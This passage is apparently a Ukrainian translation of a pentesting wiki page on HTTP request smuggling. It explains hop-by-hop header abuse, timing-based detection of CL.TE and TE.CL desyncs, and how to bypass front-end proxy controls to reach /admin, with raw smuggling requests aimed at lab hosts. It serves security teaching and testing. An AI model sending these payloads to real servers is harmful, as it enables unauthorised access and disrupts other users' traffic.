–¢—ñ–ª–æ –∑–∞–ø–∏—Ç—É –Ω–µ —î –ø–æ—Ä–æ–∂–Ω—ñ–º
```

#### –ü—Ä–∏–º—É—Å–æ–≤–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ hop-by-hop

–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ hop-by-hop –º–æ–∂–µ –≤–∫–∞–∑–∞—Ç–∏ –ø—Ä–æ–∫—Å—ñ **–≤–∏–¥–∞–ª–∏—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ Content-Length –∞–±–æ Transfer-Encoding, —â–æ–± –º–æ–∂–ª–∏–≤–æ –±—É–ª–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ HTTP-–∞—Ç–∞–∫–æ—é –∑–º–æ–≤–∏**.
```
Connection: Content-Length
```
–î–ª—è **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∑–∞–≥–æ–ª–æ–≤–∫–∏ hop-by-hop** –≤—ñ–¥–≤—ñ–¥–∞–π—Ç–µ:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## –ü–æ—à—É–∫ HTTP Request Smuggling

–í–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –Ω–∞ HTTP request smuggling —á–∞—Å—Ç–æ –º–æ–∂–ª–∏–≤–æ –¥–æ—Å—è–≥—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫ —Ç–∞–π–º—ñ–Ω–≥—É, —è–∫—ñ “ë—Ä—É–Ω—Ç—É—é—Ç—å—Å—è –Ω–∞ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—ñ, —è–∫ –¥–æ–≤–≥–æ —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–∞ –º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω—ñ –∑–∞–ø–∏—Ç–∏. –¶—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π CL.TE —Ç–∞ TE.CL. –ö—Ä—ñ–º —Ü–∏—Ö –º–µ—Ç–æ–¥—ñ–≤, —ñ—Å–Ω—É—é—Ç—å —ñ–Ω—à—ñ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –ø–æ—à—É–∫—É —Ç–∞–∫–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π:

### –ü–æ—à—É–∫ –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π CL.TE –ó–∞ –î–æ–ø–æ–º–æ–≥–æ—é –¢–µ—Ö–Ω—ñ–∫ –¢–∞–π–º—ñ–Ω–≥—É

* **–ú–µ—Ç–æ–¥:**
* –ù–∞–¥—ñ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç, —è–∫–∏–π, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º, –∑–º—É—Å–∏—Ç—å —Å–µ—Ä–≤–µ—Ä –∑—á–µ–∫–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **–°–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è:**
* –§—Ä–æ–Ω—Ç–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ `Content-Length` —Ç–∞ –ø–µ—Ä–µ–¥—á–∞—Å–Ω–æ –æ–±—Ä–∏–≤–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.
* –ë–µ–∫–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä, –æ—á—ñ–∫—É—é—á–∏ –Ω–∞ —á–∞–Ω–∫–æ–≤–∞–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, —á–µ–∫–∞—î –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —á–∞–Ω–∫, —è–∫–∏–π –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø—Ä–∏—Ö–æ–¥–∏—Ç—å, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞—Ç—Ä–∏–º–∫–∏.
* **–Ü–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏:**
* –¢–∞–π–º–∞—É—Ç–∏ –∞–±–æ –¥–æ–≤–≥—ñ –∑–∞—Ç—Ä–∏–º–∫–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
* –û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏ 400 Bad Request –≤—ñ–¥ –±–µ–∫–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä–∞, —ñ–Ω–æ–¥—ñ –∑ –¥–µ—Ç–∞–ª—å–Ω–æ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ —Å–µ—Ä–≤–µ—Ä.

### –ü–æ—à—É–∫ –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π TE.CL –ó–∞ –î–æ–ø–æ–º–æ–≥–æ—é –¢–µ—Ö–Ω—ñ–∫ –¢–∞–π–º—ñ–Ω–≥—É

* **–ú–µ—Ç–æ–¥:**
* –ù–∞–¥—ñ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç, —è–∫–∏–π, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º, –∑–º—É—Å–∏—Ç—å —Å–µ—Ä–≤–µ—Ä –∑—á–µ–∫–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **–°–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è:**
* –§—Ä–æ–Ω—Ç–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ `Transfer-Encoding` —Ç–∞ –ø–µ—Ä–µ–¥–∞—î –≤–µ—Å—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.
* –ë–µ–∫–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä, –æ—á—ñ–∫—É—é—á–∏ –Ω–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ `Content-Length`, —á–µ–∫–∞—î –Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ, —è–∫—ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø—Ä–∏—Ö–æ–¥—è—Ç—å, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞—Ç—Ä–∏–º–∫–∏.

### –Ü–Ω—à—ñ –ú–µ—Ç–æ–¥–∏ –ü–æ—à—É–∫—É –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π

* **–ê–Ω–∞–ª—ñ–∑ –†—ñ–∑–Ω–∏—Ü—ñ –í—ñ–¥–ø–æ–≤—ñ–¥–µ–π:**
* –ù–∞–¥—Å–∏–ª–∞–π—Ç–µ —Ç—Ä–æ—Ö–∏ –≤—ñ–¥–º—ñ–Ω–µ–Ω—ñ –≤–µ—Ä—Å—ñ—ó –∑–∞–ø–∏—Ç—É —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —á–∏ –≤—ñ–¥—Ä—ñ–∑–Ω—è—é—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω–∏–º —á–∏–Ω–æ–º, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ä–æ–∑–±—ñ–∂–Ω—ñ—Å—Ç—å —É –ø–∞—Ä—Å–∏–Ω–≥—É.
* **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏—Ö –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤:**
* –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è 'HTTP Request Smuggler' –≤—ñ–¥ Burp Suite, –º–æ–∂—É—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —Ü—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ —Ä—ñ–∑–Ω—ñ —Ñ–æ—Ä–º–∏ –Ω–µ–æ–¥–Ω–æ–∑–Ω–∞—á–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤ —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
* **–¢–µ—Å—Ç–∏ –Ω–∞ –í–∞—Ä—ñ–∞—Ü—ñ—é Content-Length:**
* –ù–∞–¥—Å–∏–ª–∞–π—Ç–µ –∑–∞–ø–∏—Ç–∏ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ `Content-Length`, —è–∫—ñ –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ñ–∞–∫—Ç–∏—á–Ω—ñ–π –¥–æ–≤–∂–∏–Ω—ñ –≤–º—ñ—Å—Ç—É, —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —è–∫ —Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î —Ç–∞–∫—ñ –Ω–µ—Å–ø—ñ–≤–ø–∞–¥—ñ–Ω–Ω—è.
* **–¢–µ—Å—Ç–∏ –Ω–∞ –í–∞—Ä—ñ–∞—Ü—ñ—é Transfer-Encoding:**
* –ù–∞–¥—Å–∏–ª–∞–π—Ç–µ –∑–∞–ø–∏—Ç–∏ –∑ –∑–∞—Ç–µ–º–Ω–µ–Ω–∏–º–∏ –∞–±–æ –Ω–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ `Transfer-Encoding` —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —è–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥- —Ç–∞ –±–µ–∫–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä–∏ –Ω–∞ —Ç–∞–∫—ñ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó.

### –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π HTTP Request Smuggling

–ü—ñ—Å–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ —Ç–µ—Ö–Ω—ñ–∫ —Ç–∞–π–º—ñ–Ω–≥—É –≤–∞–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –∫–ª—ñ—î–Ω—Ç—Å—å–∫–∏–º–∏ –∑–∞–ø–∏—Ç–∞–º–∏. –ü—Ä–æ—Å—Ç–∏–π –º–µ—Ç–æ–¥ - —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä—É—ó—Ç–∏ –≤–∞—à—ñ –∑–∞–ø–∏—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑—Ä–æ–±–∏—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ `/`, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å 404. –ü—Ä–∏–∫–ª–∞–¥–∏ `CL.TE` —Ç–∞ `TE.CL`, —è–∫—ñ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–∏—Å—è —Ä–∞–Ω—ñ—à–µ –≤ [–ë–∞–∑–æ–≤–∏—Ö –ü—Ä–∏–∫–ª–∞–¥–∞—Ö](./#basic-examples), –ø–æ–∫–∞–∑—É—é—Ç—å, —è–∫ –æ—Ç—Ä—É—ó—Ç–∏ –∑–∞–ø–∏—Ç –∫–ª—ñ—î–Ω—Ç–∞ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ 404, –Ω–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ç–µ, —â–æ –∫–ª—ñ—î–Ω—Ç —Å–ø—Ä—è–º–æ–≤—É—î—Ç—å—Å—è –Ω–∞ —ñ–Ω—à–∏–π —Ä–µ—Å—É—Ä—Å.

**–ö–ª—é—á–æ–≤—ñ –ü–∏—Ç–∞–Ω–Ω—è**

–ü—ñ–¥ —á–∞—Å —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –Ω–∞ request smuggling —à–ª—è—Ö–æ–º –≤—Ç—Ä—É—á–∞–Ω–Ω—è –≤ —ñ–Ω—à—ñ –∑–∞–ø–∏—Ç–∏, –ø–∞–º'—è—Ç–∞–π—Ç–µ:

* **–†—ñ–∑–Ω—ñ –ú–µ—Ä–µ–∂–µ–≤—ñ –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è:** "–ê—Ç–∞–∫–∞" —Ç–∞ "–∑–≤–∏—á–∞–π–Ω—ñ" –∑–∞–ø–∏—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ –ø–æ —Ä—ñ–∑–Ω–∏—Ö –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è—Ö. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–ª—è –æ–±–æ—Ö –Ω–µ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* **–°—Ç—ñ–π–∫—ñ URL —Ç–∞ –ü–∞—Ä–∞–º–µ—Ç—Ä–∏:** –°–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ URL —Ç–∞ –Ω–∞–∑–≤–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –¥–ª—è –æ–±–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤. –°—É—á–∞—Å–Ω—ñ –¥–æ–¥–∞—Ç–∫–∏ —á–∞—Å—Ç–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑—É—é—Ç—å –∑–∞–ø–∏—Ç–∏ –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –±–µ–∫–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ URL —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤. –í—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å —Ü–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º –∑–±—ñ–ª—å—à—É—î –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ –æ–±–∏–¥–≤–∞ –∑–∞–ø–∏—Ç–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è —Ç–∏–º —Å–∞–º–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º, —â–æ —î –ø–µ—Ä–µ–¥—É–º–æ–≤–æ—é –¥–ª—è —É—Å–ø—ñ—à–Ω–æ—ó –∞—Ç–∞–∫–∏.
* **–¢–∞–π–º—ñ–Ω–≥ —Ç–∞ –£–º–æ–≤–∏ –ì–æ–Ω–∫–∏:** "–ó–≤–∏—á–∞–π–Ω–∏–π" –∑–∞–ø–∏—Ç, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ç—Ä—É—á–∞–Ω–Ω—è –≤—ñ–¥ "–∞—Ç–∞–∫–∏", –∫–æ–Ω–∫—É—Ä—É—î –∑ —ñ–Ω—à–∏–º–∏ –æ–¥–Ω–æ—á–∞—Å–Ω–∏–º–∏ –∑–∞–ø–∏—Ç–∞–º–∏ –¥–æ–¥–∞—Ç–∫—É. –¢–æ–º—É –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ "–∑–≤–∏—á–∞–π–Ω–∏–π" –∑–∞–ø–∏—Ç –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø—ñ—Å–ª—è "–∞—Ç–∞–∫–∏". –í –∑–∞–π–Ω—è—Ç–∏—Ö –¥–æ–¥–∞—Ç–∫–∞—Ö –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è –∫—ñ–ª—å–∫–∞ —Å–ø—Ä–æ–± –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* **–í–∏–∫–ª–∏–∫–∏ –ë–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –ù–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:** –§—Ä–æ–Ω—Ç–µ–Ω–¥-—Å–µ—Ä–≤–µ—Ä–∏, —â–æ –¥—ñ—é—Ç—å —è–∫ –±–∞–ª–∞–Ω—Å—É–≤–∞–ª—å–Ω–∏–∫–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –º–æ–∂—É—Ç—å —Ä–æ–∑–ø–æ–¥—ñ–ª—è—Ç–∏ –∑–∞–ø–∏—Ç–∏ –º—ñ–∂ —Ä—ñ–∑–Ω–∏–º–∏ –±–µ–∫–µ–Ω–¥-—Å–∏—Å—Ç–µ–º–∞–º–∏. –Ø–∫—â–æ "–∞—Ç–∞–∫–∞" —Ç–∞ "–∑–≤–∏—á–∞–π–Ω–∏–π" –∑–∞–ø–∏—Ç–∏ –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å –Ω–∞ —Ä—ñ–∑–Ω—ñ —Å–∏—Å—Ç–µ–º–∏, –∞—Ç–∞–∫–∞ –Ω–µ –≤–¥–∞—Å—Ç—å—Å—è. –¶–µ–π –∞—Å–ø–µ–∫—Ç –±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–∂–µ –≤–∏–º–∞–≥–∞—Ç–∏ –∫—ñ–ª—å–∫–æ—Ö —Å–ø—Ä–æ–± –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* **–ù–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∏–π –í–ø–ª–∏–≤ –Ω–∞ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:** –Ø–∫—â–æ –≤–∞—à–∞ –∞—Ç–∞–∫–∞ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –∑–∞–ø–∏—Ç —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–µ "–∑–≤–∏—á–∞–π–Ω–∏–π" –∑–∞–ø–∏—Ç, —è–∫–∏–π –≤–∏ –Ω–∞–¥—ñ—Å–ª–∞–ª–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è), —Ü–µ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ —Ç–µ, —â–æ –≤–∞—à–∞ –∞—Ç–∞–∫–∞ –≤–ø–ª–∏–Ω—É–ª–∞ –Ω–∞ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ–¥–∞—Ç–∫—É. –ü–æ—Å—Ç—ñ–π–Ω–µ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–µ –∑–∞–≤–∞–∂–∞—Ç–∏ —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º, —â–æ –≤–∏–º–∞–≥–∞—î –æ–±–µ—Ä–µ–∂–Ω–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É.

## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è HTTP Request Smuggling

### –û–±—Ö—ñ–¥ –ë–µ–∑–ø–µ–∫–∏ –§—Ä–æ–Ω—Ç–µ–Ω–¥—É –∑–∞ –î–æ–ø–æ–º–æ–≥–æ—é HTTP Request Smuggling

–Ü–Ω–æ–¥—ñ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤—ñ –ø—Ä–æ–∫—Å—ñ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å –∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏, –∞–Ω–∞–ª—ñ–∑—É—é—á–∏ –≤—Ö—ñ–¥–Ω—ñ –∑–∞–ø–∏—Ç–∏. –û–¥–Ω–∞–∫ —Ü—ñ –∑–∞—Ö–æ–¥–∏ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏, –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ HTTP Request Smuggling, —â–æ –¥–æ–∑–≤–æ–ª—è—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–º–µ–∂–µ–Ω–∏—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–æ—Å—Ç—É–ø –¥–æ `/admin` –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–∏–π –∑–æ–≤–Ω—ñ—à–Ω—å–æ, —ñ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤–∏–π –ø—Ä–æ–∫—Å—ñ –∞–∫—Ç–∏–≤–Ω–æ –±–ª–æ–∫—É—î —Ç–∞–∫—ñ —Å–ø—Ä–æ–±–∏. –û–¥–Ω–∞–∫ —Ü–µ–π –ø—Ä–æ–∫—Å—ñ –º–æ–∂–µ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ –∑–∞–ø–∏—Ç–∏ –≤ –º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω–∏–π HTTP –∑–∞–ø–∏—Ç, –∑–∞–ª–∏—à–∞—é—á–∏ –ª–∞–∑–Ω—é –¥–ª—è –æ–±—Ö—ñ–¥—É —Ü–∏—Ö –æ–±–º–µ–∂–µ–Ω—å.

–†–æ–∑–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏, —è–∫—ñ –ø–æ–∫–∞–∑—É—é—Ç—å, —è–∫ HTTP Request Smuggling –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –æ–±—Ö–æ–¥—É –∫–æ–Ω—Ç—Ä–æ–ª—ñ–≤ –±–µ–∑–ø–µ–∫–∏ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É, —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –Ω–∞—Ü—ñ–ª–µ–Ω—ñ –Ω–∞ —à–ª—è—Ö `/admin`, —è–∫–∏–π –∑–∞–∑–≤–∏—á–∞–π –æ—Ö–æ—Ä–æ–Ω—è—î—Ç—å—Å—è —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–æ–≤–∏–º –ø—Ä–æ–∫—Å—ñ:

**–ü—Ä–∏–∫–ª–∞–¥ CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
–£ –∞—Ç–∞–∫–∏ CL.TE –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Ç—É, —Ç–æ–¥—ñ —è–∫ –≤–±—É–¥–æ–≤–∞–Ω–∏–π –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Transfer-Encoding: chunked`. –ü—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç `POST`, –∞–ª–µ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç `GET /admin`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —à–ª—è—Ö—É `/admin`.

**–ü—Ä–∏–∫–ª–∞–¥ TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
–ù–∞–≤–ø–∞–∫–∏, —É –∞—Ç–∞–∫—É TE.CL, –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç `POST` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `Transfer-Encoding: chunked`, —ñ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`. –ü–æ–¥—ñ–±–Ω–æ –¥–æ –∞—Ç–∞–∫–∏ CL.TE, –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É –Ω–µ –ø–æ–º—ñ—á–∞—î 